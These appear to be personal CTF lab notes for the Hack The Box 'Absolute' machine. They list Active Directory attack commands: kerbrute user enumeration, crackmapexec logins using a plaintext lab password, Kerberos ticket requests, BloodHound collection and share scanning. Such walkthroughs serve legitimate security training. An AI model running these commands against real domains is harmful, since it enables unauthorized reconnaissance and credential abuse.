- Kerbrute
   - set sys date to domain date
	```
	sudo ntpdate dc.absolute.htb 
	```
   - check user valid with users.txt
	```
	./kerbute userenum --dc dc.absolute.htb -d absolute.htb -o users.txt
	```
  - check user validate (-k to use Kerberos)
	```
	cme smb 10.10.11.181 -k -u d.klay -p Darkmoonsky248girl
    ```
  - generate access token
   ```
	getTGT.py absolute.htb/d.klay
	 ```
   - blood hound scrape
   ```
   KRB5CCNAME=d.klay.ccache ./bloodhound.py -k -dc dc.absolute.htb -ns 10.10.11.181 -c all -d absolute.htb -u d.klay
     ```
   - Scan shares
   ```
   cme smb 10.10.11.181 -u d.klay -p Darkmoonsky248girl -k --shares
     ```
     
   